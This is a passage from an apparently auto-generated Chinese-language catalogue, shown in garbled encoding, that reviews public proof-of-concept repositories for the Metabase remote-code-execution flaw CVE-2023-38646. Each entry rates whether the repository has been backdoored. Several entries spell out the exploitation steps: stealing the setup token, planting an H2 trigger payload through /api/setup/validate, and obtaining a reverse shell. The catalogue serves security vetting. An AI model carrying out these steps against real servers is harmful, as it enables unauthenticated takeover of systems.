*   **åå¼¹ Shell åœ°å€ï¼š** PoC ä»£ç å…è®¸ç”¨æˆ·æŒ‡å®šåå¼¹ shell çš„ IP åœ°å€å’Œç«¯å£ï¼Œä½†å¦‚æœç”¨æˆ·ä¸å°å¿ƒä½¿ç”¨äº†æ”»å‡»è€…æ§åˆ¶çš„ IP åœ°å€å’Œç«¯å£ï¼Œå¯èƒ½ä¼šè¢«åå¼¹ shellï¼Œå¯¼è‡´è‡ªèº«ç³»ç»Ÿè¢«æ”»å‡»è€…æ§åˆ¶ã€‚
*   **å…¶ä»–æ¶æ„å‘½ä»¤ï¼š**  æ”»å‡»è€…å¯èƒ½ä¼šä¿®æ”¹ PoC ä»£ç ï¼Œæ·»åŠ é¢å¤–çš„æ¶æ„å‘½ä»¤ï¼Œä¾‹å¦‚åˆ é™¤æ–‡ä»¶ã€ä¿®æ”¹ç³»ç»Ÿé…ç½®ç­‰ã€‚ä»£ç ä¸­çš„`convert_command`å‡½æ•°å’Œ`create_payload`å‡½æ•°å¯ä»¥è¢«ä¿®æ”¹æ³¨å…¥æ¶æ„ä»£ç ã€‚
*   **ä¾èµ–é¡¹é£é™©ï¼š** è™½ç„¶PoCä»£ç ä¾èµ–çš„requestsåº“æœ¬èº«é£é™©è¾ƒä½ï¼Œä½†æ˜¯å¦‚æœæ”»å‡»è€…æä¾›ä¿®æ”¹è¿‡çš„poc,å¢åŠ å…¶ä»–æ¶æ„ä¾èµ–åº“, å¯èƒ½ä¼šå­˜åœ¨å®‰å…¨é£é™©ã€‚

ç»¼åˆåˆ†æï¼ŒæŠ•æ¯’é£é™©è¯„ä¼°ä¸º 10%ï¼Œä¸»è¦é£é™©é›†ä¸­åœ¨ç”¨æˆ·é”™è¯¯ä½¿ç”¨æˆ–æ¶æ„ä¿®æ”¹ PoC ä»£ç çš„å¯èƒ½æ€§ä¸Šã€‚

**é¡¹ç›®åœ°å€:** [JayRyz/CVE-2023-38646-PoC-Metabase](https://github.com/JayRyz/CVE-2023-38646-PoC-Metabase)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #9

**æ¥æº**: [CVE-2023-38646-Mrunalkaran_CVE-2023-38646.md](../2023/CVE-2023-38646-Mrunalkaran_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Metabase open source versions before 0.46.6.1 and Metabase Enterprise versions before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹è¿è¡Œåœ¨å—å½±å“çš„ç‰ˆæœ¬ï¼Œä¸”ç½‘ç»œå¯è¾¾ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646æ˜¯ä¸€ä¸ªå­˜åœ¨äºMetabase 0.46.6.1ä¹‹å‰ç‰ˆæœ¬å’ŒMetabase Enterprise 1.46.6.1ä¹‹å‰ç‰ˆæœ¬çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ”»å‡»è€…æ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨æ­¤æ¼æ´ï¼Œé€šè¿‡ç²¾å¿ƒæ„é€ çš„è¯·æ±‚ï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä»è€Œå®Œå…¨æ§åˆ¶ç³»ç»Ÿã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Token:** POCè„šæœ¬é¦–å…ˆå°è¯•ä»`/api/session/properties`ç«¯ç‚¹è·å–setup-tokenï¼Œè¿™ä¸ªtokenç”¨äºåç»­çš„åˆ©ç”¨ã€‚
2.  **æ„é€ æ¶æ„Payload:**  è„šæœ¬æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„JSON payloadã€‚è¯¥è¿æ¥å­—ç¬¦ä¸²åˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨è¿æ¥æ—¶æ‰§è¡Œä»»æ„Javaä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªè§¦å‘å™¨ï¼Œåœ¨è®¿é—® `INFORMATION_SCHEMA.TABLES` è¡¨æ—¶æ‰§è¡Œä¸€æ®µ JavaScript ä»£ç ã€‚
3.  **æ‰§è¡Œå‘½ä»¤:**  JavaScript ä»£ç è°ƒç”¨ `java.lang.Runtime.getRuntime().exec()` æ¥æ‰§è¡Œä¸€ä¸ªåŒ…å«base64ç¼–ç çš„bashå‘½ä»¤ã€‚æ­¤å‘½ä»¤è§£ç å¹¶æ‰§è¡Œåå‘shellå‘½ä»¤ã€‚
4.  **å‘é€Payload:**  æ„é€ å¥½çš„payloadé€šè¿‡POSTè¯·æ±‚å‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ã€‚
5.  **åå‘Shell:**  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼Œæ”»å‡»è€…å°†åœ¨æŒ‡å®šçš„IPåœ°å€å’Œç«¯å£ä¸Šè·å¾—ä¸€ä¸ªåå‘shellã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æä¾›çš„ä»£ç ä¸»è¦æ˜¯åˆ©ç”¨æ¼æ´è·å–åå‘shellã€‚é€šè¿‡æ£€æŸ¥ä»£ç ï¼Œæ²¡æœ‰å‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚åˆ é™¤æ–‡ä»¶ã€ä¼ æ’­æ¶æ„è½¯ä»¶ç­‰ã€‚ä»£ç ç»“æ„æ¸…æ™°ï¼Œç›®çš„æ˜¯åˆ©ç”¨æ¼æ´ã€‚è™½ç„¶ä»£ç æœ¬èº«æ˜¯ä¸ºäº†æ”»å‡»ï¼Œä½†å®ƒæ²¡æœ‰ä¸»åŠ¨è¿›è¡Œæ¶æ„ä¼ æ’­æˆ–å…¶ä»–ç ´åè¡Œä¸ºã€‚è€ƒè™‘åˆ°ä»£ç çš„åŠŸèƒ½ä¸»è¦æ˜¯æ¼æ´åˆ©ç”¨ï¼Œè€Œéæ¤å…¥åé—¨æˆ–è¿›è¡Œå…¶ä»–æ¶æ„æ´»åŠ¨ï¼Œå› æ­¤åˆ¤å®šå­˜åœ¨æŠ•æ¯’ä»£ç çš„å¯èƒ½æ€§è¾ƒä½ã€‚

è¯¥é¡¹ç›®ä¸­å¯èƒ½å­˜åœ¨æŠ•æ¯’çš„é£é™©è¾ƒä½ï¼Œè¯„ä¼°ç»“æœä¸º1%ã€‚

**é¡¹ç›®åœ°å€:** [Mrunalkaran/CVE-2023-38646](https://github.com/Mrunalkaran/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #10

**æ¥æº**: [CVE-2023-38646-Pyr0sec_CVE-2023-38646.md](../2023/CVE-2023-38646-Pyr0sec_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (Open Source) å’Œ < 1.46.6.1 (Enterprise)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ç³»ç»Ÿè¿è¡Œå—å½±å“ç‰ˆæœ¬çš„Metabaseï¼Œä¸”æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—®è¯¥Metabaseå®ä¾‹ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 2%

## è¯¦æƒ…

CVE-2023-38646æ˜¯ä¸€ä¸ªå­˜åœ¨äºMetabaseçš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨å—å½±å“çš„MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å¤šä¸ªä¿¡æ¯æ¥æºéƒ½ç¡®è®¤äº†æ­¤æ¼æ´çš„å­˜åœ¨å’Œé«˜å±æ€§ï¼Œå¹¶æä¾›äº†å¯åˆ©ç”¨çš„POCã€‚æ¼æ´åˆ©ç”¨æ–¹å¼é€šå¸¸æ¶‰åŠæ„é€ æ¶æ„çš„è¯·æ±‚ï¼Œè§¦å‘Metabaseä¸­çš„ååºåˆ—åŒ–æˆ–å…¶ä»–ç±»å‹çš„æ¼æ´ï¼Œä»è€Œæ‰§è¡Œæ”»å‡»è€…æä¾›çš„æ¶æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š** æ¼æ´åº“ä¿¡æ¯å’Œå¤šä¸ªæœç´¢å¼•æ“ç»“æœè¡¨æ˜å­˜åœ¨å…¬å¼€å¯ç”¨çš„PoCï¼Œè¯æ˜äº†æ¼æ´çš„å¯åˆ©ç”¨æ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š** æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç åªåŒ…å«Apache Licenseã€‚å¹¶æ²¡æœ‰å‘ç°ä»»ä½•ç›´æ¥çš„æŠ•æ¯’ä»£ç ã€‚é€šå¸¸ï¼ŒæŠ•æ¯’å¯èƒ½å­˜åœ¨äºæ›´å¤æ‚çš„expæˆ–è€…åº“çš„ä¾èµ–ä¸­,ä¾‹å¦‚ï¼Œä¸€äº›å¼€å‘è€…å¯èƒ½åœ¨çœ‹ä¼¼æ— å®³çš„ä»£ç ä¸­åµŒå…¥åé—¨ï¼Œè¿™äº›åé—¨åœ¨ç‰¹å®šæ¡ä»¶ä¸‹è¢«è§¦å‘ï¼Œä»è€Œå…è®¸æ”»å‡»è€…è¿œç¨‹æ§åˆ¶å—æ„ŸæŸ“çš„ç³»ç»Ÿã€‚æœ¬æ¬¡PoCçš„æŠ•æ¯’åˆ†æå æ¯”ä¸º2%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **ç¡®å®šç›®æ ‡ï¼š** ç¡®å®šè¿è¡ŒMetabaseçš„æœåŠ¡å™¨ï¼Œå¹¶ç¡®è®¤å…¶ç‰ˆæœ¬æ˜¯å¦åœ¨å—å½±å“çš„èŒƒå›´å†…ï¼ˆä½äº0.46.6.1çš„å¼€æºç‰ˆæœ¬æˆ–ä½äº1.46.6.1çš„ä¼ä¸šç‰ˆæœ¬ï¼‰ã€‚
2.  **æ„é€ æ¶æ„è¯·æ±‚ï¼š** ä½¿ç”¨å·²çŸ¥çš„PoCæˆ–expæ„é€ åŒ…å«æ¶æ„ä»£ç çš„è¯·æ±‚ã€‚å…·ä½“çš„è¯·æ±‚æ ¼å¼å–å†³äºæ¼æ´çš„ç»†èŠ‚ï¼Œå¯èƒ½æ¶‰åŠå‘é€ç‰¹åˆ¶çš„JSONæ•°æ®ã€åˆ©ç”¨SQLæ³¨å…¥æˆ–å…¶ä»–ç±»å‹çš„æ¼æ´ã€‚
3.  **å‘é€è¯·æ±‚ï¼š** å°†æ„é€ çš„æ¶æ„è¯·æ±‚å‘é€åˆ°MetabaseæœåŠ¡å™¨çš„ç‰¹å®šç«¯ç‚¹ã€‚
4.  **æ‰§è¡Œä»£ç ï¼š** å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼ŒMetabaseæœåŠ¡å™¨å°†æ‰§è¡Œæ”»å‡»è€…æä¾›çš„æ¶æ„ä»£ç ï¼Œä»è€Œå…è®¸æ”»å‡»è€…æ§åˆ¶æœåŠ¡å™¨ã€‚


**é¡¹ç›®åœ°å€:** [Pyr0sec/CVE-2023-38646](https://github.com/Pyr0sec/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #11

**æ¥æº**: [CVE-2023-38646-Red4mber_CVE-2023-38646.md](../2023/CVE-2023-38646-Red4mber_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ), < 1.46.6.1 (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…ï¼Œä¸”æœªè¿›è¡Œç›¸åº”è¡¥ä¸ä¿®å¤ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹æ®Šçš„è¯·æ±‚åˆ©ç”¨æ­¤æ¼æ´åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Tokenï¼š** æ”»å‡»è€…é¦–å…ˆå‘ `/api/session/properties` ç«¯ç‚¹å‘é€ GET è¯·æ±‚ï¼Œä»¥è·å– `setup-token`ã€‚è¿™ä¸ªtokenç”¨äºåç»­çš„åˆ©ç”¨ã€‚
2.  **æ„é€ æ¶æ„è¯·æ±‚ï¼š** æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ SQL æ³¨å…¥çš„ JSON payloadï¼Œå¹¶å°†å…¶å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ã€‚
    *   Payload çš„ `details` å­—æ®µåŒ…å«ä¸€ä¸ªæ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œå…¶ä¸­ `TRACE_LEVEL_SYSTEM_OUT=1` å¼€å¯äº†è·Ÿè¸ªï¼Œ`CREATE TRIGGER` ç”¨äºåˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œåœ¨è®¿é—® `INFORMATION_SCHEMA.TABLES` è¡¨æ—¶æ‰§è¡Œ JavaScript ä»£ç ã€‚
    *   JavaScript ä»£ç ä½¿ç”¨ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œç»è¿‡ Base64 ç¼–ç çš„å‘½ä»¤ã€‚
3.  **æ‰§è¡Œå‘½ä»¤ï¼š** å½“ Metabase å°è¯•éªŒè¯æ•°æ®åº“è¿æ¥æ—¶ï¼Œæ¶æ„ SQL æ³¨å…¥ä¼šè¢«è§¦å‘ï¼Œä»è€Œæ‰§è¡Œæ”»å‡»è€…æä¾›çš„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æä¾›çš„PoCä»£ç æœ‰æ•ˆã€‚ä»£ç é€šè¿‡å‘é€æ¶æ„è¯·æ±‚åˆ° `/api/setup/validate` æ¥å£æ¥è§¦å‘æ¼æ´ã€‚ä»£ç é¦–å…ˆé€šè¿‡`/api/session/properties`è·å–tokenï¼Œç„¶åä½¿ç”¨åŒ…å«æ¶æ„SQLæ³¨å…¥çš„JSONæ•°æ®åŒ…é€šè¿‡POSTæ–¹æ³•å‘é€åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**

è¯¥POCä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´å®ç°RCEï¼Œæ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’è¡Œä¸ºã€‚
è™½ç„¶å­˜åœ¨æ‰§è¡Œä»»æ„å‘½ä»¤çš„é£é™©ï¼Œä½†æ˜¯payloadæ˜¯ç”±ä½¿ç”¨è€…æä¾›çš„ã€‚ä»£ç æœ¬èº«åªè´Ÿè´£æ„é€ å’Œå‘é€è¯·æ±‚ï¼Œé£é™©æ˜¯RCEæœ¬èº«å¸¦æ¥çš„ï¼Œè€Œä¸æ˜¯ä»£ç ä½œè€…æ¤å…¥çš„åé—¨ã€‚
å­˜åœ¨æä½çš„æŠ•æ¯’é£é™© (å¤§çº¦1%)ï¼Œè¯¥é£é™©æ¥è‡ªäºä½œè€…å¯èƒ½ä¼šåœ¨ä»£ç é€»è¾‘ä¸Šå­˜åœ¨ä¸€äº›éšè—çš„åé—¨ï¼Œä½†æ˜¯ä»£ç æ•´ä½“ç»“æ„å’Œé€»è¾‘éƒ½æ¯”è¾ƒç®€å•ï¼Œéšè—åé—¨çš„éš¾åº¦è¾ƒé«˜ã€‚


**é¡¹ç›®åœ°å€:** [Red4mber/CVE-2023-38646](https://github.com/Red4mber/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #12

**æ¥æº**: [CVE-2023-38646-Shisones_MetabaseRCE_CVE-2023-38646.md](../2023/CVE-2023-38646-Shisones_MetabaseRCE_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Metabase open source before 0.46.6.1 and Metabase Enterprise before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯è¢«ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨å—å½±å“çš„ Metabase å®ä¾‹ä¸Šæ‰§è¡Œè¿œç¨‹ä»£ç ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨æœ‰æ•ˆã€‚åˆ©ç”¨æ–¹å¼æ¶‰åŠå‘é€ç‰¹åˆ¶çš„è¯·æ±‚åˆ° Metabase æœåŠ¡å™¨ï¼Œåˆ©ç”¨å…¶å­˜åœ¨çš„æ¼æ´æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´å·²ç¡®è®¤å¹¶ä¸”å­˜åœ¨å¯åˆ©ç”¨çš„PoCã€‚æœç´¢å¼•æ“ç»“æœä¸­å¤šä¸ªé“¾æ¥æŒ‡å‘äº†æ¼æ´çš„è¯¦ç»†æè¿°ã€åˆ©ç”¨æ–¹æ³•å’ŒPoCä»£ç ï¼Œè¯æ˜äº†å…¶æœ‰æ•ˆæ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š**

æä¾›çš„Cargo.lockæ–‡ä»¶åªæ˜¯Rusté¡¹ç›®çš„ä¾èµ–é”å®šæ–‡ä»¶ï¼Œæœ¬èº«ä¸åŒ…å«å¯æ‰§è¡Œä»£ç ã€‚è¯„ä¼°æŠ•æ¯’é£é™©éœ€è¦æŸ¥çœ‹å®Œæ•´çš„æºä»£ç ï¼Œä½†ä»…å‡­Cargo.lockæ–‡ä»¶å¾ˆéš¾åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚è€ƒè™‘åˆ°ç¼ºä¹ç›´æ¥çš„æ¶æ„ä»£ç è¯æ®ï¼Œä»¥åŠæ¼æ´åˆ©ç”¨ä¸»è¦ä¾èµ–äºMetabaseæœ¬èº«çš„æ¼æ´ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä¼°è®¡ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

æ ¹æ®æœç´¢ç»“æœï¼Œæ”»å‡»è€…åˆ©ç”¨æ­¤æ¼æ´ï¼Œé€šè¿‡å‘é€ç‰¹åˆ¶çš„æ¶æ„è¯·æ±‚åˆ°MetabaseæœåŠ¡å™¨ï¼Œä»è€Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ— éœ€èº«ä»½éªŒè¯å³å¯è§¦å‘æ­¤æ¼æ´ã€‚


**é¡¹ç›®åœ°å€:** [Shisones/MetabaseRCE_CVE-2023-38646](https://github.com/Shisones/MetabaseRCE_CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #13

**æ¥æº**: [CVE-2023-38646-UserConnecting_Exploit-CVE-2023-38646-Metabase.md](../2023/CVE-2023-38646-UserConnecting_Exploit-CVE-2023-38646-Metabase.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** 0.46.6.1ä¹‹å‰ (å¼€æºç‰ˆ), 1.46.6.1ä¹‹å‰ (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç‰ˆæœ¬å—å½±å“ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨çš„æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´çš„åˆ©ç”¨æ–¹å¼æ˜¯ï¼š

1.  **æ¼æ´åŸç†ï¼š** è¯¥æ¼æ´å­˜åœ¨äº Metabase çš„ `/api/setup/validate` æ¥å£ï¼Œåˆ©ç”¨äº† H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡åœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­æ’å…¥æ¶æ„ SQL è¯­å¥æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚
2.  **åˆ©ç”¨æ­¥éª¤ï¼š**
    *   **è·å– `setup-token`ï¼š**  é€šè¿‡è®¿é—® `/api/session/properties` è·å– `setup-token`ã€‚
    *   **æ„é€ æ¶æ„è¯·æ±‚ï¼š**  æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ H2 è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadï¼Œè¯¥è¿æ¥å­—ç¬¦ä¸²åŒ…å«ä¸€ä¸ª `CREATE TRIGGER` è¯­å¥ï¼Œè¯¥è¯­å¥åœ¨æ¯æ¬¡æŸ¥è¯¢ `INFORMATION_SCHEMA.TABLES` æ—¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚
    *   **å‘é€è¯·æ±‚ï¼š**  å°†æ„é€ çš„ JSON payload å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚

3.  **POC åˆ†æï¼š** æä¾›çš„ Python è„šæœ¬ `metabase_exploit.py` å®ç°äº†ä¸Šè¿°æ­¥éª¤ï¼š
    *   å®ƒæ¥å— Metabase çš„ URLã€`setup-token`ã€æ“ä½œç±»å‹ï¼ˆ`exec` æˆ– `revshell`ï¼‰å’Œå‘½ä»¤ä½œä¸ºå‚æ•°ã€‚
    *   å®ƒä½¿ç”¨ `command_encoding` å‡½æ•°å¯¹å‘½ä»¤è¿›è¡Œ Base64 ç¼–ç ï¼Œå¹¶å¤„ç†å¡«å……å­—ç¬¦ `=`ã€‚
    *   å®ƒæ„é€ åŒ…å«æ¶æ„ H2 è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚
    *   å®ƒå‘é€ POST è¯·æ±‚åˆ° `/api/setup/validate` æ¥å£ã€‚

4.  **æœ‰æ•ˆæ€§ï¼š** æ ¹æ®æ¼æ´æè¿°å’Œæä¾›çš„ PoC ä»£ç ï¼Œè¯¥ PoC æ˜¯æœ‰æ•ˆçš„ï¼Œå¯ä»¥åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹æ‰§è¡Œä»»æ„ä»£ç ã€‚

5.  **æŠ•æ¯’é£é™©ï¼š**
    *   ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯æ„é€ å¹¶å‘é€æ¶æ„è¯·æ±‚ï¼Œé£é™©è¾ƒä½ã€‚
    *   `command_encoding` å‡½æ•°çœ‹èµ·æ¥æ­£å¸¸ï¼Œç”¨äºé¿å…Base64ç¼–ç ä¸­çš„å¡«å……å­—ç¬¦çš„é—®é¢˜ï¼Œä½†ä¹Ÿæœ‰å¯èƒ½å­˜åœ¨å…¶ä»–ç¼–ç æ¼æ´ã€‚
    *   ä»£ç æ˜ç¡®å£°æ˜ä»…ç”¨äºæ•™è‚²ç›®çš„ï¼Œä½†ä¸èƒ½å®Œå…¨æ’é™¤ä½œè€…æ¤å…¥åé—¨çš„å¯èƒ½ã€‚
    *   æ€»ä½“è€Œè¨€ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œå¤§æ¦‚åœ¨1%å·¦å³ã€‚ä¸»è¦é£é™©åœ¨äºä½¿ç”¨è€…æ˜¯å¦ä¼šç”¨æ­¤ä»£ç æ‰§è¡Œéæ³•æ“ä½œã€‚

ç»¼ä¸Šæ‰€è¿°ï¼ŒCVE-2023-38646 æ˜¯ä¸€ä¸ªä¸¥é‡çš„å®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æä¾›çš„ PoC ä»£ç å¯ä»¥æœ‰æ•ˆåˆ©ç”¨è¯¥æ¼æ´ï¼Œä½¿ç”¨è€…åº”è¯¥è°¨æ…å¯¹å¾…ï¼Œé¿å…æ»¥ç”¨ã€‚ä»£ç æœ¬èº«å…·æœ‰è½»å¾®çš„æŠ•æ¯’é£é™©ï¼Œä¸»è¦åœ¨äºç¼–ç å’Œå£°æ˜çš„å…è´£å£°æ˜ä¹‹é—´çš„æ½œåœ¨çŸ›ç›¾ã€‚

**é¡¹ç›®åœ°å€:** [UserConnecting/Exploit-CVE-2023-38646-Metabase](https://github.com/UserConnecting/Exploit-CVE-2023-38646-Metabase)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #14

**æ¥æº**: [CVE-2023-38646-XiaomingX_cve-2023-38646-poc.md](../2023/CVE-2023-38646-XiaomingX_cve-2023-38646-poc.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å®Œå…¨æ§åˆ¶æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªè¿›è¡Œèº«ä»½éªŒè¯é…ç½®æˆ–å·²å®Œæˆåˆå§‹è®¾ç½®ä½†æœªæ‰§è¡Œåç»­å®‰å…¨åŠ å›ºã€‚

